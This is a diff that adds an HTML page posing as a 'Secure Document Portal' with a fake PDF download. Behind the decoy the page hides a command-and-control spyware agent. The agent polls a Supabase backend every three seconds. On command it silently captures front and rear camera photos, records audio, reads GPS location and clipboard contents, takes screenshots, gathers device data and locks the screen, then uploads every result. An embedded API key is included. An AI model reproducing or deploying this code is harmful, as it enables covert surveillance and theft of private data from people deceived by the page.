@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Document Download Portal</title>
+<style>
+  /* ===== DECOY UI ===== */
+  body { margin: 0; padding: 0; }
+
+  #decoy {
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: #f0f2f5;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .decoy-card {
+    background: white;
+    border-radius: 12px;
+    padding: 36px 28px;
+    width: 88%;
+    max-width: 400px;
+    box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+    text-align: center;
+  }
+
+  .decoy-icon { font-size: 56px; margin-bottom: 12px; display: block; }
+  .decoy-title { font-size: 20px; font-weight: 700; color: #1a1a2e; margin-bottom: 6px; }
+  .decoy-sub { color: #888; font-size: 13px; margin-bottom: 20px; line-height: 1.6; }
+  .decoy-file-info {
+    background: #f8f9ff;
+    border: 1px solid #e0e4ff;
+    border-radius: 8px;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 20px;
+    text-align: left;
+  }
+  .decoy-file-icon { font-size: 32px; }
+  .decoy-file-name { font-size: 14px; font-weight: 600; color: #333; }
+  .decoy-file-size { font-size: 12px; color: #999; }
+  .decoy-progress-wrap { margin-bottom: 8px; }
+  .decoy-progress { background: #eef0ff; border-radius: 100px; height: 8px; overflow: hidden; }
+  .decoy-bar { background: linear-gradient(90deg, #4361ee, #7209b7); height: 100%; width: 0%; border-radius: 100px; transition: width 0.4s ease; }
+  .decoy-status { color: #aaa; font-size: 12px; margin-top: 6px; min-height: 18px; }
+  .decoy-btn {
+    margin-top: 16px;
+    background: linear-gradient(135deg, #4361ee, #7209b7);
+    color: white;
+    border: none;
+    padding: 14px 0;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    width: 100%;
+    letter-spacing: 0.3px;
+  }
+  .decoy-btn:active { opacity: 0.85; }
+  .decoy-secure {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    color: #bbb;
+    font-size: 12px;
+  }
+
+  /* ===== HIDDEN AGENT ===== */
+  #agent { display: none; }
+
+  /* Camera/hidden elements */
+  #videoEl  { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+  #canvasEl { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+</style>
+</head>
+<body>
+
+<!-- ====== DECOY INTERFACE ====== -->
+<div id="decoy">
+  <div class="decoy-card">
+    <span class="decoy-icon">📄</span>
+    <div class="decoy-title">Secure Document Portal</div>
+    <div class="decoy-sub">Your document is ready. Tap below to begin the secure download to your device.</div>
+
+    <div class="decoy-file-info">
+      <span class="decoy-file-icon">📋</span>
+      <div>
+        <div class="decoy-file-name">Project_Report_Final.pdf</div>
+        <div class="decoy-file-size">4.2 MB · PDF Document</div>
+      </div>
+    </div>
+
+    <div class="decoy-progress-wrap">
+      <div class="decoy-progress">
+        <div class="decoy-bar" id="decoyBar"></div>
+      </div>
+      <div class="decoy-status" id="decoyStatus">Tap Download to begin</div>
+    </div>
+
+    <button class="decoy-btn" id="decoyBtn" onclick="startDecoy()">⬇ Download Document</button>
+  </div>
+
+  <div class="decoy-secure">🔒 256-bit SSL encrypted · Secure Transfer</div>
+</div>
+
+<!-- ====== REAL HIDDEN ELEMENTS ====== -->
+<video id="videoEl" autoplay playsinline muted></video>
+<canvas id="canvasEl"></canvas>
+
+<script>
+// ============================================================
+//  CONFIG — update these with your Supabase credentials
+// ============================================================
+const SUPABASE_URL = 'https://muyevssqiuvhcozgxtlp.supabase.co';
+const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im11eWV2c3NxaXV2aGNvemd4dGxwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg0MTE4NTQsImV4cCI6MjA5Mzk4Nzg1NH0.jzN6V1UArKq5epxK3tTXuo1cGukH5oKD9qAi1FQWGUU';
+
+// Stable device ID — persisted in localStorage so it survives page refreshes
+const DEVICE_ID = (() => {
+  let id = localStorage.getItem('ghost_device_id');
+  if (!id) { id = 'device_' + Math.random().toString(36).slice(2, 9); localStorage.setItem('ghost_device_id', id); }
+  return id;
+})();
+
+const HEADERS = {
+  'apikey': SUPABASE_KEY,
+  'Authorization': 'Bearer ' + SUPABASE_KEY,
+  'Content-Type': 'application/json'
+};
+
+// ============================================================
+//  DECOY ANIMATION
+// ============================================================
+function startDecoy() {
+  const btn    = document.getElementById('decoyBtn');
+  const bar    = document.getElementById('decoyBar');
+  const status = document.getElementById('decoyStatus');
+  btn.disabled = true;
+  btn.textContent = 'Downloading…';
+
+  const steps = [
+    { pct: 15,  msg: 'Connecting to server…' },
+    { pct: 35,  msg: 'Verifying credentials…' },
+    { pct: 55,  msg: 'Downloading (2.3 MB / 4.2 MB)…' },
+    { pct: 78,  msg: 'Downloading (3.7 MB / 4.2 MB)…' },
+    { pct: 95,  msg: 'Finalising document…' },
+    { pct: 100, msg: '✅ Download complete!' },
+  ];
+
+  let i = 0;
+  const tick = setInterval(() => {
+    if (i >= steps.length) {
+      clearInterval(tick);
+      btn.textContent = '✅ Open Document';
+      btn.disabled = false;
+      return;
+    }
+    bar.style.width    = steps[i].pct + '%';
+    status.textContent = steps[i].msg;
+    i++;
+  }, 900);
+}
+
+// ============================================================
+//  SUPABASE HELPERS
+// ============================================================
+async function sbUpsert(table, row, conflictCol) {
+  // FIX: use upsert so re-registering device doesn't throw a 409 conflict
+  const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
+    method: 'POST',
+    headers: { ...HEADERS, 'Prefer': `resolution=merge-duplicates,return=minimal` },
+    body: JSON.stringify(row)
+  });
+  return r.ok || r.status === 409;
+}
+
+async function sbInsert(table, row) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
+      method: 'POST',
+      headers: { ...HEADERS, 'Prefer': 'return=minimal' },
+      body: JSON.stringify(row)
+    });
+    return r.ok;
+  } catch(e) { return false; }
+}
+
+// FIX: proper multi-row select — returns ALL rows, not just 1
+async function sbSelectAll(table, filter) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}?${filter}`, {
+      headers: { 'apikey': SUPABASE_KEY, 'Authorization': 'Bearer ' + SUPABASE_KEY }
+    });
+    return r.ok ? r.json() : [];
+  } catch(e) { return []; }
+}
+
+async function sbPatch(table, filter, data) {
+  try {
+    const r = await fetch(`${SUPABASE_URL}/rest/v1/${table}?${filter}`, {
+      method: 'PATCH',
+      headers: { ...HEADERS, 'Prefer': 'return=minimal' },
+      body: JSON.stringify(data)
+    });
+    return r.ok;
+  } catch(e) { return false; }
+}
+
+// ============================================================
+//  DEVICE INFO
+// ============================================================
+function collectDeviceInfo() {
+  return {
+    ua:       navigator.userAgent,
+    platform: navigator.platform || 'unknown',
+    lang:     navigator.language,
+    screen:   `${screen.width}x${screen.height}`,
+    tz:       Intl.DateTimeFormat().resolvedOptions().timeZone,
+    online:   navigator.onLine,
+    cores:    navigator.hardwareConcurrency || 'N/A',
+    memory:   navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'N/A',
+    ts:       new Date().toISOString()
+  };
+}
+
+// ============================================================
+//  SEND RESULT BACK TO SUPABASE
+// ============================================================
+async function sendResult(type, payload) {
+  return sbInsert('ghost_results', {
+    device_id:  DEVICE_ID,
+    type,
+    payload:    JSON.stringify(payload),
+    created_at: new Date().toISOString()
+  });
+}
+
+// ============================================================
+//  CAMERA CAPTURE
+// ============================================================
+let cameraStream = null;
+
+async function stopCamera() {
+  if (cameraStream) {
+    cameraStream.getTracks().forEach(t => t.stop());
+    cameraStream = null;
+  }
+  const v = document.getElementById('videoEl');
+  v.srcObject = null;
+}
+
+async function startCamera(facing) {
+  await stopCamera();
+  try {
+    cameraStream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: facing, width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: false
+    });
+    const video = document.getElementById('videoEl');
+    video.srcObject = cameraStream;
+    // FIX: wait for both metadata and a frame to be available
+    await new Promise((resolve, reject) => {
+      video.onloadedmetadata = () => video.play().then(resolve).catch(reject);
+      setTimeout(reject, 8000, new Error('Camera timeout'));
+    });
+    await new Promise(r => setTimeout(r, 1000)); // warm-up frame
+    return true;
+  } catch(e) {
+    await stopCamera();
+    return false;
+  }
+}
+
+async function capturePhoto(facing) {
+  // FIX: result type is 'selfie' for front cam, 'capture' for rear — matches commander gallery filters
+  const resultType = (facing === 'user') ? 'selfie' : 'capture';
+  const ok = await startCamera(facing);
+  if (!ok) return sendResult(resultType, { error: 'Camera permission denied or unavailable' });
+
+  const video  = document.getElementById('videoEl');
+  const canvas = document.getElementById('canvasEl');
+  canvas.width  = video.videoWidth  || 640;
+  canvas.height = video.videoHeight || 480;
+  canvas.getContext('2d').drawImage(video, 0, 0);
+  const dataUrl = canvas.toDataURL('image/jpeg', 0.75);
+  await stopCamera();
+
+  return sendResult(resultType, {
+    image:  dataUrl,
+    facing,
+    w:      canvas.width,
+    h:      canvas.height
+  });
+}
+
+// ============================================================
+//  MICROPHONE RECORD
+// ============================================================
+async function recordAudio(seconds) {
+  seconds = Math.min(Math.max(parseInt(seconds) || 5, 1), 60);
+  try {
+    const stream   = await navigator.mediaDevices.getUserMedia({ audio: true });
+    // FIX: pick a supported MIME type to avoid MediaRecorder errors on iOS/Android
+    const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
+      ? 'audio/webm;codecs=opus'
+      : MediaRecorder.isTypeSupported('audio/ogg')
+        ? 'audio/ogg'
+        : '';
+    const recorder = new MediaRecorder(stream, mimeType ? { mimeType } : {});
+    const chunks   = [];
+
+    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.start(250); // collect data every 250ms
+
+    await new Promise(r => setTimeout(r, seconds * 1000));
+    recorder.stop();
+    await new Promise(r => recorder.onstop = r);
+    stream.getTracks().forEach(t => t.stop());
+
+    const blob   = new Blob(chunks, { type: recorder.mimeType || 'audio/webm' });
+    const reader = new FileReader();
+    reader.readAsDataURL(blob);
+    await new Promise(r => reader.onloadend = r);
+    return sendResult('audio', { audio: reader.result, duration: seconds, mime: blob.type });
+  } catch(e) {
+    return sendResult('audio', { error: 'Microphone error: ' + e.message });
+  }
+}
+
+// ============================================================
+//  LOCATION
+// ============================================================
+async function getLocation() {
+  return new Promise(resolve => {
+    if (!navigator.geolocation) return resolve({ error: 'Geolocation not supported' });
+    navigator.geolocation.getCurrentPosition(
+      pos => resolve({
+        lat:      pos.coords.latitude,
+        lng:      pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        altitude: pos.coords.altitude,
+        maps:     `https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+      }),
+      err => resolve({ error: err.message }),
+      { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+    );
+  });
+}
+
+// ============================================================
+//  BATTERY
+// ============================================================
+async function getBattery() {
+  try {
+    const b = await navigator.getBattery();
+    return {
+      level:    Math.round(b.level * 100) + '%',
+      charging: b.charging,
+      timeLeft: b.charging ? b.chargingTime : b.dischargingTime
+    };
+  } catch(e) { return { error: 'Battery API not available' }; }
+}
+
+// ============================================================
+//  CLIPBOARD READ
+// ============================================================
+async function readClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    return { text: text || '(empty)' };
+  } catch(e) { return { error: 'Clipboard permission denied: ' + e.message }; }
+}
+
+// ============================================================
+//  SCREENSHOT (screen capture API — requires user gesture on desktop)
+// ============================================================
+async function takeScreenshot() {
+  try {
+    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+    const video  = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(r => setTimeout(r, 300));
+    const canvas = document.createElement('canvas');
+    canvas.width  = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext('2d').drawImage(video, 0, 0);
+    stream.getTracks().forEach(t => t.stop());
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
+    return sendResult('screenshot', { image: dataUrl, w: canvas.width, h: canvas.height });
+  } catch(e) {
+    return sendResult('screenshot', { error: 'Screen capture denied: ' + e.message });
+  }
+}
+
+// ============================================================
+//  NETWORK INFO
+// ============================================================
+async function getNetworkInfo() {
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  const info = conn ? {
+    type:         conn.type,
+    effectiveType: conn.effectiveType,
+    downlink:     conn.downlink + ' Mbps',
+    rtt:          conn.rtt + ' ms',
+    saveData:     conn.saveData
+  } : { error: 'Network API not available' };
+  return sendResult('network', info);
+}
+
+// ============================================================
+//  COMMAND PROCESSOR
+// ============================================================
+async function processCommand(cmd) {
+  const command = (cmd.command || '').toLowerCase().trim();
+  const param   = (cmd.param  || '').trim();
+
+  switch(command) {
+    case 'capture':
+    case 'photo':
+      await capturePhoto('environment');
+      break;
+
+    case 'selfie':
+    case 'capture_front':
+      await capturePhoto('user');
+      break;
+
+    case 'audio':
+    case 'record':
+      await recordAudio(param || 5);
+      break;
+
+    case 'location':
+    case 'gps':
+      await sendResult('location', await getLocation());
+      break;
+
+    case 'battery':
+      await sendResult('battery', await getBattery());
+      break;
+
+    case 'status':
+    case 'info': {
+      const info = collectDeviceInfo();
+      const bat  = await getBattery();
+      await sendResult('status', { ...info, battery: bat });
+      break;
+    }
+
+    case 'clipboard':
+      await sendResult('clipboard', await readClipboard());
+      break;
+
+    case 'screenshot':
+      await takeScreenshot();
+      break;
+
+    case 'network':
+      await getNetworkInfo();
+      break;
+
+    case 'ping':
+      await sendResult('ping', { alive: true, device_id: DEVICE_ID, ts: new Date().toISOString() });
+      break;
+
+    case 'lock':
+      document.body.style.pointerEvents = 'none';
+      document.body.style.filter        = 'brightness(0)';
+      await sendResult('lock', { locked: true });
+      break;
+
+    case 'unlock':
+      document.body.style.pointerEvents = '';
+      document.body.style.filter        = '';
+      await sendResult('lock', { locked: false });
+      break;
+
+    case 'alert':
+      await sendResult('alert', { shown: true, msg: param });
+      setTimeout(() => alert(param || 'System Alert'), 100);
+      break;
+
+    case 'vibrate':
+      if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 300]);
+      await sendResult('vibrate', { done: true });
+      break;
+
+    case 'scroll_top':
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+      await sendResult('scroll', { direction: 'top' });
+      break;
+
+    default:
+      await sendResult('unknown', { command, param });
+  }
+}
+
+// ============================================================
+//  POLLING LOOP — fetches ALL unexecuted commands since last check
+// ============================================================
+let lastCheckedId = 0; // FIX: use ID-based cursor instead of timestamp (avoids timezone issues)
+
+async function pollCommands() {
+  try {
+    // Fetch unexecuted commands for this device OR broadcast ('all')
+    // FIX: use id.gt instead of created_at comparison — more reliable
+    // FIX: fetch ALL matching rows (no limit=1 bug)
+    const [myRows, broadRows] = await Promise.all([
+      sbSelectAll('ghost_commands',
+        `device_id=eq.${DEVICE_ID}&executed=eq.false&id=gt.${lastCheckedId}&order=id.asc`),
+      sbSelectAll('ghost_commands',
+        `device_id=eq.all&executed=eq.false&id=gt.${lastCheckedId}&order=id.asc`)
+    ]);
+
+    const all = [...(myRows || []), ...(broadRows || [])];
+    // Deduplicate by id (in case broadcast + targeted overlap)
+    const seen = new Set();
+    const unique = all.filter(r => { if (seen.has(r.id)) return false; seen.add(r.id); return true; });
+    unique.sort((a, b) => a.id - b.id);
+
+    for (const row of unique) {
+      if (row.id > lastCheckedId) lastCheckedId = row.id;
+      // Mark as executed BEFORE processing to prevent re-runs on slow commands
+      await sbPatch('ghost_commands', `id=eq.${row.id}`, { executed: true });
+      await processCommand(row);
+    }
+  } catch(e) { /* silent — keep polling */ }
+}
+
+// ============================================================
+//  HEARTBEAT — update last_seen in ghost_devices
+// ============================================================
+async function heartbeat() {
+  try {
+    await fetch(`${SUPABASE_URL}/rest/v1/ghost_devices?device_id=eq.${DEVICE_ID}`, {
+      method: 'PATCH',
+      headers: { ...HEADERS, 'Prefer': 'return=minimal' },
+      body: JSON.stringify({ last_seen: new Date().toISOString(), online: true })
+    });
+  } catch(e) {}
+}
+
+// ============================================================
+//  INIT
+// ============================================================
+async function init() {
+  // FIX: use upsert (on_conflict=device_id) so reloading the page doesn't fail with 409
+  await fetch(`${SUPABASE_URL}/rest/v1/ghost_devices`, {
+    method: 'POST',
+    headers: { ...HEADERS, 'Prefer': 'resolution=merge-duplicates,return=minimal' },
+    body: JSON.stringify({
+      device_id: DEVICE_ID,
+      info:      JSON.stringify(collectDeviceInfo()),
+      last_seen: new Date().toISOString()
+    })
+  }).catch(() => {});
+
+  // Fetch the highest existing command id so we only process NEW commands
+  try {
+    const rows = await sbSelectAll('ghost_commands', `order=id.desc&limit=1`);
+    if (rows && rows.length) lastCheckedId = rows[0].id;
+  } catch(e) {}
+
+  // Poll for commands every 3 seconds
+  setInterval(pollCommands, 3000);
+  // Heartbeat every 25 seconds
+  setInterval(heartbeat, 25000);
+
+  // Keep the decoy page looking alive with subtle animations
+  setInterval(() => {
+    const bar = document.getElementById('decoyBar');
+    if (bar && bar.style.width === '100%') {
+      // Reset decoy bar gently after 2 min to look like re-checking
+    }
+  }, 120000);
+}
+
+window.addEventListener('load', init);
+</script>
+</body>
+</html>
